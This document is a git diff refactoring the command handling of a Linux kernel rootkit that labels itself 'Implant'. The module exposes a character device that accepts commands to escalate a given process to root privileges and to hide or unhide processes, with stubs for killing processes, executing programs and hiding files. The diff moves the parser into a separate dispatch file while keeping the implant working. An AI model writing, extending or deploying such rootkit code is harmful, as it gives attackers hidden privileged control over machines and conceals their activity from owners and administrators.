@@ -6,9 +6,8 @@
 #include <linux/uaccess.h>
 #include <linux/string.h>
 
-#include "ketopt.h"
-#include "privilege_escalation.h"
 #include "hide_proc.h"
+#include "commands.h"
 
 MODULE_DESCRIPTION("Implant");
 MODULE_AUTHOR("sc");
@@ -30,31 +29,9 @@ static ssize_t implant_dev_read(struct file *fp, char __user *buf, size_t len,
 				loff_t *offset);
 static ssize_t implant_dev_write(struct file *fp, const char *buf, size_t len,
 				 loff_t *offset);
-int implant_handle_args(const char *buf);
-int implant_dispatch_cmd(int argc, char **argv);
 
 struct file_operations fops = { .read = implant_dev_read,
 				.write = implant_dev_write };
-
-static ko_longopt_t priv_longopts[] = {
-	{ "pid", ko_required_argument, 101 },
-	{ "perm", ko_required_argument, 102 },
-	{ NULL, 0, 0 },
-};
-
-static ko_longopt_t proc_longopts[] = {
-	{ "show", ko_required_argument, 201 },
-	{ "hide", ko_required_argument, 202 },
-	{ "kill", ko_required_argument, 203 },
-	{ "exec", ko_required_argument, 204 },
-	{ NULL, 0, 0 },
-};
-
-static ko_longopt_t file_longopts[] = {
-	{ "show", ko_required_argument, 301 },
-	{ "hide", ko_required_argument, 302 },
-	{ NULL, 0, 0 },
-};
 
 static ssize_t implant_dev_read(struct file *fp, char __user *buf, size_t len,
 				loff_t *offset)
@@ -62,122 +39,13 @@ static ssize_t implant_dev_read(struct file *fp, char __user *buf, size_t len,
 	return 0;
 }
 
-int implant_dispatch_cmd(int argc, char **argv)
-{
-	ketopt_t opt_main = KETOPT_INIT;
-	ketopt_t opt_sub = KETOPT_INIT;
-	ko_longopt_t *longopts = NULL;
-	char *cmd = NULL;
-	int err = 0;
-	int c;
-
-	while ((c = ketopt(&opt_main, argc, argv, 0, "", 0)) >= 0) {
-		/* read until first command */
-	}
-
-	if (opt_main.ind == argc) {
-		printk(KERN_WARNING "%s: Missing command\n", THIS_MODULE->name);
-		return -EINVAL;
-	}
-
-	cmd = argv[opt_main.ind];
-	if (strncmp("priv", cmd, 4) == 0) {
-		longopts = priv_longopts;
-	} else if (strncmp("ps", cmd, 2) == 0) {
-		longopts = proc_longopts;
-	} else if (strncmp("file", cmd, 4) == 0) {
-		longopts = file_longopts;
-	} else {
-		printk(KERN_WARNING "%s: Unknown command\n", THIS_MODULE->name);
-		return -EINVAL;
-	}
-
-	/* parse command arguments */
-	while ((c = ketopt(&opt_sub, argc - opt_main.ind, argv + opt_main.ind,
-			   1, "", longopts)) >= 0) {
-		switch (c) {
-		case 101:
-			if (opt_sub.arg) {
-				int pid;
-				if (kstrtol(opt_sub.arg, 10, (long *)&pid)) {
-					err++;
-					break;
-				}
-				escalate_pid(pid);
-			} else {
-				err++;
-			}
-			break;
-		case 102:
-			/* TODO: perm is ignored for now */
-			break;
-		case 201:
-			if (opt_sub.arg) {
-				unhide_proc(opt_sub.arg);
-			} else {
-				err++;
-			}
-			break;
-		case 202:
-			if (opt_sub.arg) {
-				hide_proc(opt_sub.arg);
-			} else {
-				err++;
-			}
-			break;
-		case 203:
-			/* TODO: implement later */
-			break;
-		case 204:
-			/* TODO: implement later */
-			break;
-		case 301:
-			/* TODO: implement later */
-			break;
-		case 302:
-			/* TODO: implement later */
-			break;
-		case '?':
-			printk(KERN_WARNING "%s: Unknown option: -%c\n",
-			       THIS_MODULE->name,
-			       opt_sub.opt ? opt_sub.opt : ':');
-			err++;
-			break;
-		case ':':
-			printk(KERN_WARNING "%s: Missing arg: -%c\n",
-			       THIS_MODULE->name,
-			       opt_sub.opt ? opt_sub.opt : ':');
-			err++;
-			break;
-		default:
-			printk(KERN_WARNING "%s: Unable to handle arguments\n",
-			       THIS_MODULE->name);
-			err++;
-			break;
-		}
-	}
-
-	return err ? -EINVAL : 0;
-}
-
-int implant_handle_args(const char *buf)
-{
-	int ret = 0;
-	int argc = 0;
-	char **argv = argv_split(GFP_KERNEL, buf, &argc);
-
-	ret = implant_dispatch_cmd(argc, argv);
-
-	argv_free(argv);
-
-	return ret;
-}
-
 static ssize_t implant_dev_write(struct file *fp, const char *buf, size_t len,
 				 loff_t *offset)
 {
 	int ret = 0;
 	char *args_buf = kcalloc(len + 1, sizeof(char), GFP_KERNEL);
+	char **argv;
+	int argc = 0;
 
 	if (!args_buf) {
 		printk(KERN_WARNING "%s: Failed to allocate command buffer",
@@ -192,8 +60,15 @@ static ssize_t implant_dev_write(struct file *fp, const char *buf, size_t len,
 		goto err_free_buf;
 	}
 
-	implant_handle_args(args_buf);
-	/* ignores incorrect commands/args */
+	argv = argv_split(GFP_KERNEL, args_buf, &argc);
+	if (!argv) {
+		ret = -ENOMEM;
+		goto err_free_buf;
+	}
+
+	commands_dispatch(argc, argv);
+
+	argv_free(argv);
 	ret = len;
 
 err_free_buf:
